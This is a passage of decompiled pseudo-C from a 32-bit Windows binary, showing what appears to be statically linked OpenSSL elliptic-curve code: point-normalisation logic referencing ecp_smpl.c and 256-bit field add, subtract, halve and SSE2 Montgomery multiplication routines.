LABEL_26:
          if ( !sub_4211F0(v8, (_DWORD *)Block[v5 - 1], a1[9], v7) )
          {
            sub_408310(16, 137, 3, (int)"crypto\\ec\\ecp_smpl.c", 1269);
            goto LABEL_55;
          }
          v16 = (int (__cdecl *)(int **, void **, void **, int *))(*a1)[37];
          if ( !v16
            || v16(a1, v8, v8, v7) && ((int (__cdecl *)(int **, void **, void **, int *))(*a1)[37])(a1, v8, v8, v7) )
          {
            v17 = v5 - 1;
            if ( v17 )
            {
              v25 = &Block[v17 - 1];
              while ( sub_416DB0(*(_DWORD *)(*(_DWORD *)(a3 + 4 * v17) + 12))
                   || ((int (__cdecl *)(int **, _DWORD *, _DWORD, void **, int *))(*a1)[34])(a1, v27, *v25, v8, v7)
                   && ((int (__cdecl *)(int **, void **, void **, _DWORD, int *))(*a1)[34])(
                        a1,
                        v8,
                        v8,
                        *(_DWORD *)(*(_DWORD *)(a3 + 4 * v17) + 12),
                        v7)
                   && sub_4173E0(*(_DWORD **)(*(_DWORD *)(a3 + 4 * v17) + 12), v27) )
              {
                --v25;
                if ( !--v17 )
                  goto LABEL_38;
              }
            }
            else
            {
LABEL_38:
              v18 = a3;
              if ( sub_416DB0(*(_DWORD *)(*(_DWORD *)a3 + 12)) || sub_4173E0(*(_DWORD **)(*(_DWORD *)a3 + 12), v8) )
              {
                v26 = 0;
                while ( 1 )
                {
                  v19 = *(_DWORD **)(v18 + 4 * v26);
                  if ( !sub_416DB0(v19[3]) )
                  {
                    if ( !((int (__cdecl *)(int **, void **, _DWORD, int *))(*a1)[35])(a1, v8, v19[3], v7)
                      || !((int (__cdecl *)(int **, _DWORD, _DWORD, void **, int *))(*a1)[34])(
                            a1,
                            v19[1],
                            v19[1],
                            v8,
                            v7)
                      || !((int (__cdecl *)(int **, void **, void **, _DWORD, int *))(*a1)[34])(a1, v8, v8, v19[3], v7)
                      || !((int (__cdecl *)(int **, _DWORD, _DWORD, void **, int *))(*a1)[34])(
                            a1,
                            v19[2],
                            v19[2],
                            v8,
                            v7) )
                    {
                      goto LABEL_54;
                    }
                    v20 = (int (__cdecl *)(int **, _DWORD, int *))(*a1)[39];
                    if ( !(v20 ? v20(a1, v19[3], v7) : sub_417490((_DWORD *)v19[3], 1)) )
                      goto LABEL_54;
                    v19[4] = 1;
                  }
                  if ( ++v26 >= a2 )
                    break;
                  v18 = a3;
                }
                v29 = 1;
              }
            }
LABEL_54:
            v5 = a2;
          }
        }
      }
    }
  }
LABEL_55:
  sub_420750(v7);
  sub_4206C0(v28);
  if ( Block )
  {
    for ( i = 0; i < v5; sub_417000((_DWORD *)Block[i++]) )
    {
      if ( !Block[i] )
        break;
    }
    sub_413490(Block);
  }
  return v29;
}
// 483777: conditional instruction was optimized away because %arg_4.4!=0
// 483520: conditional instruction was optimized away because %arg_4.4!=0

//----- (004838C0) --------------------------------------------------------
int __cdecl sub_4838C0(int a1, _DWORD *a2, int *a3, unsigned int **a4, int *a5)
{
  return sub_42A430(a2, a3, a4, *(int **)(a1 + 36), a5);
}

//----- (004838F0) --------------------------------------------------------
int __cdecl sub_4838F0(int a1, int *a2, int *a3, int *a4)
{
  return sub_42A4B0(a2, a3, *(int **)(a1 + 36), a4);
}

//----- (004A90C0) --------------------------------------------------------
unsigned int __cdecl sub_4A90C0(_DWORD *a1, _DWORD *a2)
{
  return sub_4A9220(a2, a1, a2);
}

//----- (004A90E0) --------------------------------------------------------
unsigned int __cdecl sub_4A90E0(_DWORD *a1, _DWORD *a2)
{
  _DWORD v3[12]; // [esp+0h] [ebp-30h] BYREF

  sub_4A9220(a2, v3, a2);
  return sub_4A9220(a2, a1, v3);
}

//----- (004A9110) --------------------------------------------------------
int __cdecl sub_4A9110(__int64 *a1, _DWORD *a2)
{
  return sub_4A9130(a1, a2);
}

//----- (004A9130) --------------------------------------------------------
int __usercall sub_4A9130@<eax>(__int64 *a1@<edi>, _DWORD *a2@<esi>)
{
  int v2; // ebp
  int v3; // ecx
  unsigned __int64 v4; // kr00_8
  bool v5; // cf
  int v6; // ecx
  int v7; // ett
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  int v11; // ett
  int v12; // ecx
  BOOL v13; // ett
  int v14; // eax
  int v15; // ebx
  int v16; // eax
  BOOL v17; // ett
  int v18; // ebx
  int v19; // ett
  unsigned int v20; // edx
  int v21; // ebp
  unsigned int v22; // ebx
  unsigned int v23; // eax
  unsigned int v24; // ebp
  unsigned int v25; // ebx
  unsigned int v26; // ecx
  int result; // eax

  v2 = *a2 & 1;
  v3 = a2[2];
  v5 = __CFADD__(__CFADD__(-v2, *a2), a2[1]);
  v4 = *(_QWORD *)a2 + __PAIR64__(-v2, -v2);
  *(_DWORD *)a1 = *a2 - v2;
  v7 = v5 | __CFADD__(-v2, HIDWORD(v4));
  v5 = __CFADD__(v7, v3);
  v6 = v7 + v3;
  *((_DWORD *)a1 + 1) = HIDWORD(v4);
  *((_DWORD *)a1 + 2) = v6 - v2;
  v8 = a2[3];
  v9 = a2[4];
  v11 = v5 | __CFADD__(-v2, v6);
  v5 = __CFADD__(v11, v8);
  v10 = v11 + v8;
  v12 = a2[5];
  v13 = v5;
  v5 = __CFADD__(v5, v9);
  *((_DWORD *)a1 + 3) = v10;
  *((_DWORD *)a1 + 4) = v13 + v9;
  *((_DWORD *)a1 + 5) = v5 + v12;
  v14 = a2[6];
  v15 = a2[7];
  v17 = __CFADD__(v5, v12);
  v5 = __CFADD__(v17, v14);
  v16 = v17 + v14;
  v19 = v5 | __CFADD__(v2, v16);
  v5 = __CFADD__(v19, v15);
  v18 = v19 + v15;
  v5 |= __CFADD__(-v2, v18);
  *((_DWORD *)a1 + 6) = v2 + v16;
  *((_DWORD *)a1 + 7) = v18 - v2;
  v20 = *((_DWORD *)a1 + 3);
  v21 = *((_DWORD *)a1 + 1) >> 1;
  v22 = *((_DWORD *)a1 + 2);
  *(_DWORD *)a1 = *a1 >> 1;
  v23 = *((_DWORD *)a1 + 4);
  *((_DWORD *)a1 + 1) = (v22 << 31) | v21;
  v24 = *((_DWORD *)a1 + 5);
  *((_DWORD *)a1 + 2) = (v20 << 31) | (v22 >> 1);
  v25 = *((_DWORD *)a1 + 6);
  *((_DWORD *)a1 + 3) = (v23 << 31) | (v20 >> 1);
  v26 = *((_DWORD *)a1 + 7);
  *((_DWORD *)a1 + 4) = (v24 << 31) | (v23 >> 1);
  result = (v25 << 31) | (v24 >> 1);
  *((_DWORD *)a1 + 5) = result;
  *((_DWORD *)a1 + 6) = (v26 << 31) | (v25 >> 1);
  *((_DWORD *)a1 + 7) = (v5 << 31) | (v26 >> 1);
  return result;
}

//----- (004A9200) --------------------------------------------------------
unsigned int __cdecl sub_4A9200(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  return sub_4A9220(a3, a1, a2);
}

//----- (004A9220) --------------------------------------------------------
unsigned int __usercall sub_4A9220@<eax>(_DWORD *a1@<ebp>, _DWORD *a2@<edi>, _DWORD *a3@<esi>)
{
  int v3; // ecx
  __int64 v4; // kr00_8
  int v5; // edx
  bool v6; // cf
  int v7; // ecx
  BOOL v8; // ett
  int v9; // edx
  BOOL v10; // ett
  int v11; // eax
  int v12; // ebx
  int v13; // ecx
  int v14; // eax
  BOOL v15; // ett
  int v16; // edx
  int v17; // ebx
  int v18; // ett
  int v19; // ecx
  BOOL v20; // ett
  int v21; // edx
  BOOL v22; // ett
  unsigned int v23; // esi
  BOOL v24; // ebp
  unsigned int v25; // ecx
  unsigned int v26; // edx
  unsigned int v27; // ett
  unsigned int v28; // eax
  unsigned int v29; // ebx
  unsigned int v30; // ecx
  unsigned int result; // eax
  unsigned int v32; // edx

  v3 = a3[2];
  v5 = a3[3];
  v4 = *(_QWORD *)a1 + *(_QWORD *)a3;
  v6 = __CFADD__(__CFADD__(*a1, *a3), a3[1]) | __CFADD__(a1[1], HIDWORD(v4));
  *a2 = v4;
  v8 = v6;
  v6 = __CFADD__(v6, v3);
  v7 = v8 + v3;
  v6 |= __CFADD__(a1[2], v7);
  v7 += a1[2];
  a2[1] = HIDWORD(v4);
  v10 = v6;
  v6 = __CFADD__(v6, v5);
  v9 = v10 + v5;
  v6 |= __CFADD__(a1[3], v9);
  v9 += a1[3];
  a2[2] = v7;
  a2[3] = v9;
  v11 = a3[4];
  v12 = a3[5];
  v13 = a3[6];
  v15 = v6;
  v6 = __CFADD__(v6, v11);
  v14 = v15 + v11;
  v16 = a3[7];
  v18 = v6 | __CFADD__(a1[4], v14);
  v6 = __CFADD__(v18, v12);
  v17 = v18 + v12;
  v6 |= __CFADD__(a1[5], v17);
  v17 += a1[5];
  a2[4] = a1[4] + v14;
  v20 = v6;
  v6 = __CFADD__(v6, v13);
  v19 = v20 + v13;
  v6 |= __CFADD__(a1[6], v19);
  v19 += a1[6];
  a2[5] = v17;
  v22 = v6;
  v6 = __CFADD__(v6, v16);
  v21 = v22 + v16;
  v6 |= __CFADD__(a1[7], v21);
  v21 += a1[7];
  a2[6] = v19;
  a2[7] = v21;
  v23 = ~((__PAIR64__(v6, a2[7])
         - ((unsigned int)(a2[6] < (unsigned int)(*((_QWORD *)a2 + 2) < (unsigned __int64)(*((_QWORD *)a2 + 1) < (unsigned __int64)((unsigned int)(a2[1] < (unsigned int)(*a2 != -1) - 1) - 1)))
                                 + 1)
          - 1)) >> 32);
  v24 = (((__PAIR64__(v6, a2[7])
         - ((unsigned int)(a2[6] < (unsigned int)(*((_QWORD *)a2 + 2) < (unsigned __int64)(*((_QWORD *)a2 + 1) < (unsigned __int64)((unsigned int)(a2[1] < (unsigned int)(*a2 != -1) - 1) - 1)))
                                 + 1)
          - 1)) >> 32) & 0x80000000) == 0i64;
  v25 = a2[2];
  v26 = a2[3];
  v6 = *(_QWORD *)a2 < __PAIR64__(v23, v23);
  *(_QWORD *)a2 -= __PAIR64__(v23, v23);
  v27 = v6 + v23;
  v6 = v25 < v27;
  *((_QWORD *)a2 + 1) = __PAIR64__(v26, v25) - v27;
  v28 = a2[4];
  v29 = a2[5];
  v30 = a2[6];
  v6 = __PAIR64__(v28, v26) < v6;
  result = v28 - v6;
  v32 = a2[7];
  a2[4] = result;
  a2[5] = v29 - v6;
  *((_QWORD *)a2 + 3) = __PAIR64__(v32, v30) - __PAIR64__(v23, (unsigned int)(v29 < v6) + v24);
  return result;
}

//----- (004A92F0) --------------------------------------------------------
int __cdecl sub_4A92F0(_DWORD *a1, int a2, int a3)
{
  return sub_4A9310(a3, a1, a2);
}

//----- (004A9310) --------------------------------------------------------
int __usercall sub_4A9310@<eax>(int a1@<ebp>, _DWORD *a2@<edi>, int a3@<esi>)
{
  unsigned int v3; // ecx
  __int64 v4; // kr00_8
  unsigned int v5; // edx
  bool v6; // cf
  unsigned int v7; // ecx
  unsigned int v8; // ett
  unsigned int v9; // ett
  unsigned int v10; // eax
  unsigned int v11; // ebx
  unsigned int v12; // ecx
  unsigned int v13; // eax
  unsigned int v14; // ett
  unsigned int v15; // edx
  unsigned int v16; // ebx
  unsigned int v17; // ett
  unsigned int v18; // ecx
  unsigned int v19; // ett
  unsigned int v20; // esi
  int v21; // ett
  int v22; // ecx
  unsigned __int64 v23; // kr10_8
  int v24; // edx
  int v25; // ecx
  int v26; // ett
  int v27; // eax
  int v28; // ebx
  int v29; // ecx
  int result; // eax
  BOOL v31; // ett
  int v32; // edx
  int v33; // ebx
  BOOL v34; // ett
  int v35; // ecx
  BOOL v36; // ett

  v3 = *(_DWORD *)(a3 + 8);
  v5 = *(_DWORD *)(a3 + 12);
  v6 = *(_QWORD *)a3 < *(_QWORD *)a1;
  v4 = *(_QWORD *)a3 - *(_QWORD *)a1;
  *a2 = v4;
  v8 = v6 + *(_DWORD *)(a1 + 8);
  v6 = v3 < v8;
  v7 = v3 - v8;
  a2[1] = HIDWORD(v4);
  v9 = v6 + *(_DWORD *)(a1 + 12);
  a2[2] = v7;
  a2[3] = v5 - v9;
  v10 = *(_DWORD *)(a3 + 16);
  v11 = *(_DWORD *)(a3 + 20);
  v12 = *(_DWORD *)(a3 + 24);
  v14 = (v5 < v9) + *(_DWORD *)(a1 + 16);
  v6 = v10 < v14;
  v13 = v10 - v14;
  v15 = *(_DWORD *)(a3 + 28);
  v17 = v6 + *(_DWORD *)(a1 + 20);
  v6 = v11 < v17;
  v16 = v11 - v17;
  v19 = v6 + *(_DWORD *)(a1 + 24);
  v6 = v12 < v19;
  v18 = v12 - v19;
  a2[4] = v13;
  v21 = v6 + *(_DWORD *)(a1 + 28);
  a2[5] = v16;
  v20 = (v15 - (unsigned __int64)(unsigned int)v21) >> 32;
  a2[6] = v18;
  a2[7] = v15 - v21;
  v22 = a2[2];
  v24 = a2[3];
  v6 = __CFADD__(__CFADD__(v20, *a2), a2[1]);
  v23 = __PAIR64__(v20, v20) + *(_QWORD *)a2;
  *(_QWORD *)a2 = v23;
  v26 = v6 | __CFADD__(v20, HIDWORD(v23));
  v6 = __CFADD__(v26, v22);
  v25 = v26 + v22;
  v6 |= __CFADD__(v20, v25);
  a2[2] = v20 + v25;
  a2[3] = v6 + v24;
  v27 = a2[4];
  v28 = a2[5];
  v29 = a2[6];
  v31 = __CFADD__(v6, v24);
  v6 = __CFADD__(v31, v27);
  result = v31 + v27;
  v32 = a2[7];
  v34 = v6;
  v6 = __CFADD__(v6, v28);
  v33 = v34 + v28;
  a2[4] = result;
  v36 = v6;
  v6 = __CFADD__(v6, v29);
  v35 = v36 + v29;
  a2[5] = v33;
  a2[6] = (v20 >> 31) + v35;
  a2[7] = v20 + (v6 | __CFADD__(v20 >> 31, v35)) + v32;
  return result;
}

//----- (004A93A0) --------------------------------------------------------
int __cdecl sub_4A93A0(_DWORD *a1, int a2)
{
  int v3[12]; // [esp+0h] [ebp-30h] BYREF

  memset(v3, 0, 32);
  return sub_4A9310(a2, a1, (int)v3);
}

//----- (004A93E0) --------------------------------------------------------
void *sub_4A93E0()
{
  void *retaddr; // [esp+0h] [ebp+0h]

  return retaddr;
}

//----- (004A93F0) --------------------------------------------------------
unsigned int __cdecl sub_4A93F0(_DWORD *a1, unsigned int *a2)
{
  return sub_4A94B0(dword_73C6D0, (unsigned int *)dword_4A9000, a1, a2);
}
// 4A9000: using guessed type int dword_4A9000[2];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004A9420) --------------------------------------------------------
unsigned int __cdecl sub_4A9420(_DWORD *a1, unsigned int *a2)
{
  return sub_4A94B0(dword_73C6D0, (unsigned int *)dword_4A9040, a1, a2);
}
// 4A9040: using guessed type int dword_4A9040[8];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004A9450) --------------------------------------------------------
unsigned int __cdecl sub_4A9450(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  return sub_4A94B0(dword_73C6D0, a3, a1, a2);
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004A9480) --------------------------------------------------------
unsigned int __cdecl sub_4A9480(_DWORD *a1, unsigned int *a2)
{
  return sub_4A94B0(dword_73C6D0, a2, a1, a2);
}
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004A94B0) --------------------------------------------------------
unsigned int __usercall sub_4A94B0@<eax>(
        int a1@<eax>,
        unsigned int *a2@<ebp>,
        _DWORD *a3@<edi>,
        unsigned int *a4@<esi>)
{
  __m128i v4; // xmm7
  unsigned int *v5; // ebp
  __m128i v6; // xmm6
  __m128i v7; // xmm7
  __m128i v8; // xmm1
  __m128i v9; // xmm0
  __m128i v10; // xmm2
  __m128i v11; // xmm5
  __m128i v12; // xmm4
  __m128i v13; // xmm5
  __m128i v14; // xmm3
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm2
  __m128i v18; // xmm3
  __m128i v19; // xmm2
  __m128i v20; // xmm4
  __m128i v21; // xmm0
  __m128i v22; // xmm3
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i v25; // xmm7
  int v26; // ecx
  unsigned int *v27; // ebp
  __m128i v28; // xmm0
  __m128i v29; // xmm5
  __m128i v30; // xmm1
  __m128i v31; // xmm0
  __m128i v32; // xmm3
  __m128i v33; // xmm2
  __m128i v34; // xmm7
  __m128i v35; // xmm1
  __m128i v36; // xmm2
  __m128i v37; // xmm0
  __m128i v38; // xmm5
  __m128i v39; // xmm0
  __m128i v40; // xmm3
  __m128i si128; // xmm1
  __m128i v42; // xmm5
  __m128i v43; // xmm2
  __m128i v44; // xmm3
  __m128i v45; // xmm2
  __m128i v46; // xmm1
  __m128i v47; // xmm3
  __m128i v48; // xmm0
  __m128i v49; // xmm7
  __m128i v50; // xmm1
  __m128i v51; // xmm2
  __m128i v52; // xmm3
  __m128i v53; // xmm0
  int v54; // eax
  __m128i v55; // xmm5
  __m128i v56; // xmm0
  bool v57; // cf
  __m128i v58; // xmm1
  unsigned int v59; // eax
  __m128i v60; // xmm4
  __m128i v61; // xmm1
  unsigned int v62; // ett
  __m128i v63; // xmm2
  unsigned int v64; // eax
  __m128i v65; // xmm5
  __m128i v66; // xmm2
  unsigned int v67; // ett
  __m128i v68; // xmm3
  unsigned int v69; // eax
  BOOL v70; // ett
  __m128i v71; // xmm0
  unsigned int v72; // eax
  unsigned int v73; // eax
  BOOL v74; // ett
  __m128i v75; // xmm1
  unsigned int v76; // ebx
  __m128i v77; // xmm2
  unsigned int v78; // ecx
  __m128i v79; // xmm2
  unsigned int v80; // ebx
  BOOL v81; // ett
  unsigned int v82; // ecx
  unsigned int v83; // ett
  unsigned __int64 v84; // kr20_8
  BOOL v85; // ett
  BOOL v86; // ett
  int v87; // ett
  unsigned int result; // eax
  BOOL v89; // ett
  unsigned int v90; // ebx
  BOOL v91; // ett
  unsigned int v92; // ecx
  BOOL v93; // ett
  unsigned int v94; // eax
  unsigned int v95; // ebx
  unsigned __int64 v96; // rax
  unsigned int v97; // ecx
  unsigned __int64 v98; // kr28_8
  unsigned __int64 v99; // rax
  unsigned int v100; // kr04_4
  unsigned int v101; // ecx
  unsigned __int64 v102; // kr30_8
  unsigned __int64 v103; // rax
  unsigned int v104; // kr08_4
  unsigned int v105; // ecx
  unsigned __int64 v106; // kr38_8
  unsigned __int64 v107; // rax
  unsigned int v108; // kr0C_4
  unsigned int v109; // ecx
  unsigned __int64 v110; // kr40_8
  unsigned __int64 v111; // rax
  unsigned int v112; // kr10_4
  unsigned int v113; // ecx
  unsigned __int64 v114; // kr48_8
  unsigned __int64 v115; // rax
  unsigned __int64 v116; // kr58_8
  int v117; // ett
  BOOL v118; // ett
  unsigned int v119; // ebx
  unsigned int v120; // edi
  unsigned __int64 v121; // kr50_8
  unsigned int v122; // ecx
  unsigned __int64 v123; // rax
  unsigned __int64 v124; // kr78_8
  unsigned __int64 v125; // rax
  unsigned __int64 v126; // kr88_8
  unsigned __int64 v127; // rax
  unsigned __int64 v128; // kr98_8
  unsigned __int64 v129; // rax
  unsigned __int64 v130; // krA8_8
  unsigned __int64 v131; // rax
  unsigned __int64 v132; // krB8_8
  unsigned __int64 v133; // rax
  unsigned __int64 v134; // krC8_8
  unsigned __int64 v135; // rax
  unsigned __int64 v136; // krD8_8
  int v137; // edi
  BOOL v138; // ett
  unsigned int v139; // ebx
  unsigned int v140; // edi
  unsigned __int64 v141; // kr60_8
  unsigned int v142; // krE0_4
  unsigned int v143; // ecx
  unsigned __int64 v144; // rax
  unsigned __int64 v145; // krF8_8
  unsigned __int64 v146; // rax
  unsigned __int64 v147; // kr108_8
  unsigned __int64 v148; // rax
  unsigned __int64 v149; // kr118_8
  unsigned __int64 v150; // rax
  unsigned __int64 v151; // kr128_8
  unsigned __int64 v152; // rax
  unsigned __int64 v153; // kr138_8
  unsigned __int64 v154; // rax
  unsigned __int64 v155; // kr148_8
  unsigned __int64 v156; // rax
  unsigned __int64 v157; // kr158_8
  int v158; // edi
  BOOL v159; // ett
  unsigned int v160; // ebx
  unsigned int v161; // edi
  unsigned __int64 v162; // kr68_8
  unsigned int v163; // kr160_4
  unsigned int v164; // ecx
  unsigned __int64 v165; // rax
  unsigned __int64 v166; // kr178_8
  unsigned __int64 v167; // rax
  unsigned __int64 v168; // kr188_8
  unsigned __int64 v169; // rax
  unsigned __int64 v170; // kr198_8
  unsigned __int64 v171; // rax
  unsigned __int64 v172; // kr1A8_8
  unsigned __int64 v173; // rax
  unsigned __int64 v174; // kr1B8_8
  unsigned __int64 v175; // rax
  unsigned __int64 v176; // kr1C8_8
  unsigned __int64 v177; // rax
  unsigned __int64 v178; // kr1D8_8
  int v179; // edi
  BOOL v180; // ett
  unsigned int v181; // ebx
  unsigned int v182; // edi
  unsigned __int64 v183; // krE8_8
  unsigned int v184; // kr1E0_4
  unsigned int v185; // ecx
  unsigned __int64 v186; // rax
  unsigned __int64 v187; // kr1F8_8
  unsigned __int64 v188; // rax
  unsigned __int64 v189; // kr208_8
  unsigned __int64 v190; // rax
  unsigned __int64 v191; // kr218_8
  unsigned __int64 v192; // rax
  unsigned __int64 v193; // kr228_8
  unsigned __int64 v194; // rax
  unsigned __int64 v195; // kr238_8
  unsigned __int64 v196; // rax
  unsigned __int64 v197; // kr248_8
  unsigned __int64 v198; // rax
  unsigned __int64 v199; // kr258_8
  int v200; // edi
  BOOL v201; // ett
  unsigned int v202; // ebx
  unsigned int v203; // edi
  unsigned __int64 v204; // kr168_8
  unsigned int v205; // kr260_4
  unsigned int v206; // ecx
  unsigned __int64 v207; // rax
  unsigned __int64 v208; // kr278_8
  unsigned __int64 v209; // rax
  unsigned __int64 v210; // kr288_8
  unsigned __int64 v211; // rax
  unsigned __int64 v212; // kr298_8
  unsigned __int64 v213; // rax
  unsigned __int64 v214; // kr2A8_8
  unsigned __int64 v215; // rax
  unsigned __int64 v216; // kr2B8_8
  unsigned __int64 v217; // rax
  unsigned __int64 v218; // kr2C8_8
  unsigned __int64 v219; // rax
  unsigned __int64 v220; // kr2D8_8
  int v221; // edi
  BOOL v222; // ett
  unsigned int v223; // ebx
  unsigned int v224; // edi
  unsigned __int64 v225; // kr1E8_8
  unsigned int v226; // kr2E0_4
  unsigned int v227; // ecx
  unsigned __int64 v228; // rax
  unsigned __int64 v229; // kr2F8_8
  unsigned __int64 v230; // rax
  unsigned __int64 v231; // kr308_8
  unsigned __int64 v232; // rax
  unsigned __int64 v233; // kr318_8
  unsigned __int64 v234; // rax
  unsigned __int64 v235; // kr328_8
  unsigned __int64 v236; // rax
  unsigned __int64 v237; // kr338_8
  unsigned __int64 v238; // rax
  unsigned __int64 v239; // kr348_8
  unsigned __int64 v240; // rax
  unsigned __int64 v241; // kr358_8
  int v242; // edi
  BOOL v243; // ett
  unsigned int v244; // ebx
  unsigned int v245; // edi
  unsigned __int64 v246; // kr268_8
  unsigned int v247; // kr360_4
  unsigned int v248; // ecx
  unsigned __int64 v249; // rax
  unsigned __int64 v250; // kr378_8
  unsigned __int64 v251; // rax
  unsigned __int64 v252; // kr388_8
  unsigned __int64 v253; // rax
  unsigned __int64 v254; // kr398_8
  unsigned __int64 v255; // rax
  unsigned __int64 v256; // kr3A8_8
  unsigned __int64 v257; // rax
  unsigned __int64 v258; // kr3B8_8
  unsigned __int64 v259; // rax
  unsigned __int64 v260; // kr3C8_8
  unsigned __int64 v261; // rax
  unsigned __int64 v262; // kr3D8_8
  int v263; // ebp
  BOOL v264; // ett
  unsigned int v265; // edi
  unsigned __int64 v266; // kr2E8_8
  int v267; // kr3E0_4
  unsigned int v268; // ecx
  unsigned int v269; // ett
  __int64 v270; // kr3F0_8
  unsigned __int64 v271; // kr3F8_8
  BOOL v272; // ett
  BOOL v273; // ett
  int v274; // ett
  BOOL v275; // ett
  int v276; // ebx
  unsigned __int64 v277; // kr368_8
  BOOL v278; // ett
  __m128i v279; // [esp+0h] [ebp-100h] BYREF
  __m128i v280; // [esp+10h] [ebp-F0h] BYREF
  __m128i v281; // [esp+20h] [ebp-E0h] BYREF
  __m128i v282; // [esp+30h] [ebp-D0h] BYREF
  __m128i v283; // [esp+40h] [ebp-C0h] BYREF
  __m128i v284; // [esp+50h] [ebp-B0h] BYREF
  __m128i v285[2]; // [esp+60h] [ebp-A0h] BYREF
  __m128i v286; // [esp+80h] [ebp-80h] BYREF
  __m128i v287; // [esp+90h] [ebp-70h] BYREF
  __m128i v288; // [esp+A0h] [ebp-60h] BYREF
  __m128i v289; // [esp+B0h] [ebp-50h] BYREF
  __m128i v290; // [esp+C0h] [ebp-40h] BYREF
  _BYTE v291[48]; // [esp+D0h] [ebp-30h] BYREF

  if ( (a1 & 0x5000000) == 83886080 )
  {
    v4 = _mm_cvtsi32_si128(*a2);
    v5 = a2 + 1;
    v6 = _mm_srli_epi64((__m128i)-1i64, 0x30u);
    v7 = _mm_shuffle_epi32(_mm_shufflelo_epi16(v4, 220), 220);
    v8 = _mm_cvtsi32_si128(a4[1]);
    v286 = _mm_shuffle_epi32(_mm_cvtsi32_si128(*a4), 204);
    v9 = _mm_mul_epu32(v286, v7);
    v10 = _mm_cvtsi32_si128(a4[2]);
    v287 = _mm_shuffle_epi32(v8, 204);
    v11 = _mm_add_epi64(_mm_slli_si128(_mm_move_epi64(v9), 6), v9);
    v12 = _mm_srli_si128(v11, 10);
    v13 = _mm_and_si128(v11, v6);
    v14 = _mm_cvtsi32_si128(a4[3]);
    v288 = _mm_shuffle_epi32(v10, 204);
    v279 = _mm_add_epi64(_mm_mul_epu32(v287, v7), v12);
    v15 = _mm_cvtsi32_si128(a4[4]);
    v289 = _mm_shuffle_epi32(v14, 204);
    v280 = _mm_mul_epu32(v288, v7);
    v16 = _mm_cvtsi32_si128(a4[5]);
    v290 = _mm_shuffle_epi32(v15, 204);
    v281 = _mm_add_epi64(_mm_mul_epu32(v289, v7), v13);
    v17 = _mm_cvtsi32_si128(a4[6]);
    *(__m128i *)v291 = _mm_shuffle_epi32(v16, 204);
    v282 = _mm_mul_epu32(v290, v7);
    v18 = _mm_cvtsi32_si128(a4[7]);
    *(__m128i *)&v291[16] = _mm_shuffle_epi32(v17, 204);
    v19 = _mm_mul_epu32(*(__m128i *)&v291[16], v7);
    v283 = _mm_mul_epu32(*(__m128i *)v291, v7);
    v20 = _mm_sub_epi64(_mm_shuffle_epi32(v13, 177), v13);
    v21 = _mm_cvtsi32_si128(*v5);
    *(__m128i *)&v291[32] = _mm_shuffle_epi32(v18, 204);
    v22 = _mm_mul_epu32(*(__m128i *)&v291[32], v7);
    v23 = _mm_shufflelo_epi16(v21, 220);
    v24 = _mm_load_si128(&v286);
    v25 = _mm_shuffle_epi32(v23, 220);
    v26 = 6;
    v27 = v5 + 1;
    do
    {
      v284 = _mm_add_epi64(v19, v13);
      v285[0] = _mm_add_epi64(v22, v20);
      v28 = _mm_add_epi64(_mm_mul_epu32(v24, v25), v279);
      v29 = _mm_add_epi64(_mm_slli_si128(_mm_move_epi64(v28), 6), v28);
      v279 = _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(_mm_load_si128(&v287), v25), v280), _mm_srli_si128(v29, 10));
      v280 = _mm_add_epi64(_mm_mul_epu32(_mm_load_si128(&v288), v25), v281);
      v13 = _mm_and_si128(v29, v6);
      v30 = _mm_mul_epu32(_mm_load_si128((const __m128i *)v291), v25);
      v31 = _mm_add_epi64(_mm_mul_epu32(_mm_load_si128(&v290), v25), v283);
      v281 = _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(_mm_load_si128(&v289), v25), v282), v13);
      v32 = v25;
      v33 = _mm_mul_epu32(_mm_load_si128((const __m128i *)&v291[16]), v25);
      v34 = _mm_cvtsi32_si128(*v27++);
      v20 = _mm_sub_epi64(_mm_shuffle_epi32(v13, 177), v13);
      v282 = v31;
      v22 = _mm_mul_epu32(v32, *(__m128i *)&v291[32]);
      v25 = _mm_shuffle_epi32(_mm_shufflelo_epi16(v34, 220), 220);
      v24 = _mm_load_si128(&v286);
      v283 = _mm_add_epi64(v30, v284);
      v19 = _mm_add_epi64(v33, v285[0]);
      --v26;
    }
    while ( v26 );
    v35 = _mm_load_si128(&v287);
    v284 = _mm_add_epi64(v19, v13);
    v36 = _mm_load_si128(&v288);
    v285[0] = _mm_add_epi64(v22, v20);
    v37 = _mm_add_epi64(_mm_mul_epu32(v24, v25), v279);
    v38 = _mm_add_epi64(_mm_slli_si128(_mm_move_epi64(v37), 6), v37);
    v39 = _mm_load_si128(&v290);
    v40 = _mm_mul_epu32(_mm_load_si128(&v289), v25);
    v279 = _mm_add_epi64(_mm_add_epi64(_mm_mul_epu32(v35, v25), v280), _mm_srli_si128(v38, 10));
    si128 = _mm_load_si128((const __m128i *)v291);
    v280 = _mm_add_epi64(_mm_mul_epu32(v36, v25), v281);
    v42 = _mm_and_si128(v38, v6);
    v43 = _mm_load_si128((const __m128i *)&v291[16]);
    v281 = _mm_add_epi64(_mm_add_epi64(v40, v282), v42);
    v44 = _mm_load_si128((const __m128i *)&v291[32]);
    v45 = _mm_mul_epu32(v43, v25);
    v46 = _mm_add_epi64(_mm_mul_epu32(si128, v25), v284);
    v282 = _mm_add_epi64(_mm_mul_epu32(v39, v25), v283);
    v47 = _mm_mul_epu32(v44, v25);
    v48 = _mm_load_si128(&v279);
    v49 = _mm_slli_si128((__m128i)-1i64, 8);
    v283 = v46;
    v284 = _mm_add_epi64(_mm_add_epi64(v45, v285[0]), v42);
    v285[0] = _mm_add_epi64(v47, _mm_sub_epi64(_mm_shuffle_epi32(v42, 177), v42));
    v50 = _mm_load_si128(&v280);
    v51 = _mm_load_si128(&v281);
    v52 = _mm_load_si128(&v282);
    v53 = _mm_srli_si128(_mm_add_epi64(_mm_and_si128(v48, v49), _mm_slli_si128(_mm_move_epi64(v48), 6)), 6);
    v54 = _mm_cvtsi128_si32(v53);
    v55 = _mm_add_epi64(_mm_move_epi64(v50), _mm_srli_si128(v53, 4));
